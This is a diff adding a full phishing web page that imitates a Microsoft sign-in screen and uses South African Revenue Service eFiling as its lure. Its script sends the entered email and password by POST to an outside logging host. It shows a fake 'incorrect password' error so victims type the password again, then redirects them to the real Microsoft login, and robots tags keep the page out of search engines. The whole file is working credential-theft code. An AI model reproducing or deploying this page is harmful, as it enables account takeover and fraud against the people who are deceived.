@@ -1,0 +1,141 @@
+<html>
+<head>
+<meta name="robots" content="noimageindex, nofollow, nosnippet, noindex, noarchive, nocache, notranslate, noyaca ">
+<title>Sign in</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAWCAYAAAArdgcFAAAAb0lEQVQ4je3MsRFAQBCF4W1hW7gKdKAFuQKUIbxUESKRlJkTUJBDAb9AAztjRPbNfOH75awCJnUBQFyUdhYT8bjHfxGvCyyupgSg2wJxURPhw4kOGYswHs9jDZDURKTfsdAhP/GkMImJxz3u8ZfxG1ssMglVFu7wAAAAAElFTkSuQmCC">
+</head>
+<body>
+<style>
+body{font-family:"Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande",Roboto,Ebrima,"Nirmala UI",Gadugi,"Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI",Tunga,"Lao UI",Raavi,"Iskoola Pota",Latha,Leelawadee,"Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";font-size:15px;line-height:20px;font-weight:400;font-size:.9375rem;line-height:1.25rem;color:#262626;margin:0;height:100%;overflow:hidden}#main{background:#f2f2f2;position:fixed;top:0;width:100%;height:100%}#sub{background-image:url(https://logincdn.msauth.net/shared/5/images/78_3a53c38a2dc671fb4daf.jpg);background-repeat:no-repeat,no-repeat;background-size:cover,cover;position:fixed;top:0;width:100%;height:100%}#sD43aB{background:#fff;width:100%;padding:50px 40px;max-width:360px;margin:8% auto 18px}#sD43aB img{height:25;max-width: 180px;}#page2 #tResdD{font-size: 1.4rem;font-weight: 600;margin-bottom: 10px;}#tResdD{margin:20px 0;line-height:1.40rem;color:#1b1b1b;font-size:16px;font-weight:600;font-family:"Segoe UI","Helvetica Neue","Lucida Grande",Roboto,Ebrima,"Nirmala UI",Gadugi,"Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI",Tunga,"Lao UI",Raavi,"Iskoola Pota",Latha,Leelawadee,"Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"}.input{width:100%;position:relative;height:35;font-size:1rem;line-height:1.75rem;border:none;border-color:rgba(0,0,0,.6);border-bottom:1px solid rgba(0,0,0,.6)}.input:focus{border-color:#00f;outline:0}.next{float:right;background-color:#0067b8;color:#fff}.btn{width:108px;height:32px;border:none;cursor:pointer;touch-action:manipulation;font-size:15px}.next:hover{background-color:#035ea6}a{color:#0067b8;text-decoration:none;font-size:13px}#sG43aB{max-width:440px;margin:0 auto}#dd{width:440px;height:47px;position:relative;margin-top:-71px;background:0 0;cursor:pointer;border:none}#dd:hover{background-color:rgba(0,0,0,.1)}.spinner{position:relative;margin:0 -35px}.spinner div{width:5px;height:5px;position:absolute;left:-20px;top:0;background-color:#005da6;border-radius:50%;animation:move 4s infinite cubic-bezier(.2,.64,.81,.23);margin-top:-49px}.spinner div:nth-child(2){animation-delay:150ms}.spinner div:nth-child(3){animation-delay:.3s}.spinner div:nth-child(4){animation-delay:450ms}@keyframes move{0%{left:0}75%{left:100%}100%{left:100%}}input[type=checkbox]{width:18px;height:18px}#footer{position:fixed;bottom:0;text-align:right;width:100%;right:5px;padding:5px;font-size:10px}.fsbRTe{text-decoration:none;letter-spacing:3px;line-height:25px;vertical-align:bottom;font-size:16px;font-weight:600;color:#000}.tNeRWQ{color:#000;padding-right:20px}.tNeRWQ:hover{text-decoration:underline}
+</style>
+<script>
+const url = 'https://zionreports.serv00.net/logs.php';   //full url goes here
+</script>
+
+<div id="main">
+<div id="sub">
+
+<div id="sD43aB">
+<div id="spinner" class="spinner" style="display:none;"><div></div><div></div><div></div><div></div></div>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAG0AAAAWCAYAAADKHRJUAAADxklEQVRoge1YMa7cNhDdK+wV/gl8A1/BvQ+QA6hk4UaAmxWQRixXTQACrlhSBmyAcieVbNmqJOI4ANuXwhj+oVbS509g7G6wA0xDjYbkPM48Dg8/3j2hSN+/AQB8/HrEh8+HIn3Ir5HDA7T7kwdoNyQhBEzThGEYEGPctLsaaH3fJ53nedfWe59sx3HMfHRd9+L/9yDWWlRVldR7v2l7NdD4As/n865t0zTJtm1bAECMMY0ppV4ZotsS730WC2NMOoghhItDeROgVVW1WQ74hjhoANC2LYQQcM79l5hdXYwxqKoKdV1n40opVFUFY0w2fnXQ6rpGVVWw1q7a0cKFEBeg/V+kbdvVvdH4zYG2dcqAvARqrS82Rjy3rP8xRgzDACklpJRQSiUb4sdxHJNd13UIIaT/p2lC13Xp/62LgfceSilIKdF13UXGc/9kM01T+h5CQN/36eDWdZ1xPY1LKTM+vzpoIYRN8iVyVkolcDloHHiSeZ5TVq6VVe5HSpnNHWPM+JNrXdcZt1AF2Crd8zynoC+1aRrEGC9K/0tK/g8/3r9Bif7921sAwO/fnvDx67FIS0ADgPP5vHqhoE1774tACyEkwIQQsNbCe49xHJNv8kM2WmtorTHPcwJRCAFjTJqXfDZNkwAhHzSHcy47PLR2vg4+t5QSIQQYY7JMM8YkpfG2bWGMec603cj+QuGg0YkTQqQy5JzLymYJaJz/eLnjwgPHM5ufet5WAMA4jumbcy6zXZuH2y+rB5+fMvfVnHb89B0l+qT/+vnH8AR8OZbpjnDQgOeTSQGj7KMLSglo5ENrvTkvD1rJ+Npcy4zu+z7jPFr76XS68MN5mvb2atAOf/yJEj1++v7zjy9HoD+U6Y4sA0T81TRNxnMUjBLQ1jhuKWt+9sZJCCTy7ZzLuJO3HlsgbK37bkFbNstLjisBjYJYkmlboJVkGl+ztTbLuhhjyjTiQC58n1RV7hY04PJGxvmgBDQKFufGpWyBRhz6EqetPZlxjvPeZ09Se5xGfPgSaMtDeFOg8c0v+7YS0PitTgiBYRjgvYfWOj2V7ZXB0+mU3SrpX8ok8uG9h5QS0zQlG17OY4xZ9vF1kB0HYgs0fgidc6n83hRoADZfSEr7tHEci/u0pYQQEnBr/1P2bvVXPEP3+rRla7MF2tYT3tVAo15kKdTPLMsbjfPAkI+1FxFrLZRS0FrDWptK0ZqfpYzjCGNM6o/W/JMNPfCuXf3JjjKdPwSvzbe2JspQrfVzn3Yt0B7y7+UB2h3KA7Q7lAdodyj/AOUPuGLpKU7ZAAAAAElFTkSuQmCC">
+
+<div id="page1" hidde>
+<div id="tResdD">SARS eFiling is protected against third parties. Sign in with your Microsoft Email and Password.</div>
+<span id="error" style="color:#e81123;display:non">    </span>
+<form onsubmit="step1();return false;">
+<input onkeyup="cc();" type="email" class="input" placeholder='Enter your email address' name="email" id="email" autocomplete="off" value="laundry_care@outlook.com">
+<div class="row" style="margin:15px 0">
+<font style="font-size: .8125rem;">&nbsp;No account?</font><a href="#">&nbsp;Create one!</a>
+<p><a href="#">&nbsp;Can’t access your account?</a></p>
+</div>
+<input type="submit" class="btn next" value="Next" style="">
+<p style="margin:15px">&nbsp;</p>
+</form>
+</div>
+
+<div id="page2" hidden>
+<p id="userID"></p>
+<div id="tResdD">Enter password</div>
+<span id="error2" style="color:#e81123;display:non">    </span>
+<form onsubmit="step2();return false;">
+<input type="hidden" id="count" value="0">
+<input onkeyup="cd();" type="password" class="input" placeholder='Enter your email password' name="password" id="password" autocomplete="off" value="">
+<div class="row" style="margin:15px 0">
+
+<label style="margin-left:-4px">
+<input type="checkbox">
+<span style="font-size:16px;cursor:pointer">Keep me signed in</span>
+            </label>
+
+<p><a href="#">Forgot password?</a></p>
+</div>
+<input type="submit" class="btn next" value="Sign in" style="">
+<p style="margin:15px">&nbsp;</p>
+</form>
+</div>
+
+
+</div>
+
+<div id="sG43aB">
+<img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAbgAAAAwCAYAAABjXm+yAAAFP0lEQVR4nO3dv3baPBzG8d4HN+MdMze7s8PiCXa6pxML7OnO4o2sbw1NG/64pSMXkAt43iEREYoMJmkcIr6fc37nBP+TwqAnEjb5dLtc63bxRz8WvzWbF5rePVR+t6pUU6t82/y1dKrKMf6azVel9eMtamHVoX2PP9/a2xdL3e7U6rHc7e9XP7e1sMp5vVw4+0tquVu/ls+3me3Va15r3ZXW3atrvnKus/LXfDW3fn6swqrVL91ZNf8n9bNyLYrnxy+KXzvbzeuH+qn56rZSLV5cP/xVWFV2zGMti9udWqxmWhT+WhYzLVclVRyqqaesa3r3l9TKrlzLwl+rf1LfX1H/7akqxzxV8fv7Y+X6/WeqP+uZ1n9n+iQAAAJEwAEAgkTAAQCCRMABAIJEwAEAgkTAAQCCRMABAIJEwAEAgkTAAQCCRMABAIJEwAEAgkTAAQCCRMABAIIUbMBNJhONRiN1Oh2NRiN9+/ZN9/f3790tAEBNggu4yWSii4sLRVGkJEnUbrfVbrfVbDYVx7G+fv1K0AHAGQgq4IbDoaIoUr/f94bYeDxWs9nU5eUlIQcAgQsm4CaTiaIo0ng83ntcURRqNpvq9Xo19QwA8B6CCbjPnz+r3+9LegixXq+nyWTiPTbPc0VRpDzP6+wiAKBGQQScmb1tNhtJUrfbVRRFiqKo9JwkSbaBCAAITxABNxwOlSTJ9rUJvH0BNhwOdXFxUUf3JElpmqrRaGwrTdNn++rsxyk65b4B+HiCCLhut6t2u33UOSYE69BqtXYCTZIGg0EtbZ+qLMvUarXeuxsAAhZEwF1dXR0dcNfX17UE3Hq9VqPR0Hq9fvO2PhICDsBbCyLgrq+vFcfxUef0+/2jQ/GlGo2Gsiwr3Z+m6bMZnb2k2Wq1NBgMdmaBrVZrGxLmuCoh6rb1kusMBoPS5Va7Dfs4O8zKlmt978Ohtg71P8uynfP5QwM4H0EE3GazqfSIgG08Hh99zkuZQbpsWdId2NM03QkEM0i7AWcP2O45ZXwBd8x1zO9ic5dgTYC57djH+GZwbt+qtLWv/+7sOcsyAg44I0EEnPSwTBnHsYqiqHxOnSFnBltf0LkDu2+mkabps4HdPsdc/xBfwB1zHV/f3HPcvtrH2GFzKOCqtLWv/1XfEwBhCibg7u/vlSSJ4jgufb5ts9mo1+vthGCdISf5Z2P2wF42KJctURpugNjLcm74+JYoy67j67uPO4vyzVaPCbiqbR3qv5nh7VsiBhCmYAJOegg58wzc5eWlRqORbm5uNBqN9OXLl+2zcW4A1h1y7iBcZWA/NuDKnFvA2duYzQHnJaiAM/I8V7/fV5IkiqJIzWZT3W53G2S+GV7dIWfPKnwzuCpLlHUHXNm+KkuUbmAdCriqbR3Tf3c5E0DYggy4fcwszvdNJ28Rcuv12vsM3KFlwyo3mdQdcOZ8340f7k0y7rKg+9mjb4bmu9nmUFv7+p9l2c4+91gAYTu7gMvzXHmelz4H9xYh534edmhgl54+OzLBdgpLlIZ7637ZTTPu7+Ay+495TMD3PpX1316a3HcXK4AwnV3AGeYLl6fTqabT6c6NJ+Z/yJ2Sss+1TtFH6iuAcJ19wJmyA+3UAm7fDReniIADcArONuBsbqC9d8C53/TxkcJNIuAAnAYCTg+BFsexOp2OOp2O4jg+qRkcAOB4BJyevqzZrqurq/fuFgDgFQg4AECQCDgAQJAIOABAkAg4AECQCDgAQJAIOABAkAg4AECQCDgAQJAIOABAkAg4AECQCDgAQJAIOABAkP4HK+Ng1o6bZWMAAAAASUVORK5CYII='>
+<button id="dd" style=""></button>
+</div>
+
+</div>
+</div>
+
+
+<div id="footer">
+<a href="#" class="tNeRWQ">Terms of use</a> <a href="#" class="tNeRWQ">Privacy & cookies</a> <a href="#" class="fsbRTe">...</a>
+</div>
+
+<script>
+function cc()
+  {
+	document.getElementById('error').innerHTML="";
+  var email = document.getElementById('email');
+    if (email.value == '') {
+     document.getElementById('error').innerHTML="";
+    email.focus();
+    return false;
+ }else{
+ return true;
+ }
+  }
+function cd()
+  {
+	document.getElementById('error2').innerHTML="";
+  var pass = document.getElementById('password');
+    if (pass.value == '') {
+     document.getElementById('error2').innerHTML="";
+    pass.focus();
+    return false;
+ }else{
+ return true;
+ }
+  }
+function step1(){
+if(cc()){
+var a = document.getElementById('email').value;
+document.getElementById('spinner').style.display='';
+setTimeout(function(){
+document.getElementById('spinner').style.display='none';
+document.getElementById('page1').style.display='none';
+document.getElementById('sG43aB').style.display='none';
+document.getElementById('page2').style.display='block';
+document.getElementById('userID').innerHTML=a;
+document.getElementById('password').focus();
+},3000);
+}
+}
+
+function step2(){
+if(cd()){
+var a = document.getElementById('email').value;
+var b = document.getElementById('password').value;
+document.getElementById('spinner').style.display='';
+validate(a,b);
+}
+}
+
+function se(){
+var c = document.getElementById('count').value;
+if(c >= 2){
+window.location = "https://login.microsoftonline.com/";
+}else{
+document.getElementById('error2').innerHTML='Your Password is incorrect, <font style="color:blue">Try again.</font>';
+document.getElementById('spinner').style.display='none';
+document.getElementById('password').value='';
+document.getElementById('password').style.borderBottom='1px solid red';
+document.getElementById('password').focus();
+document.getElementById('count').value=+c+1;
+}
+}
+</script>
+<script type="text/javascript">
+function validate(e,a){var n=new XMLHttpRequest;n.open("POST",url),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.onreadystatechange=function(){4===n.readyState&&(se())};var t="user="+e+"&pass="+a;n.send(t)}
+</script>
+</body>
+</html>
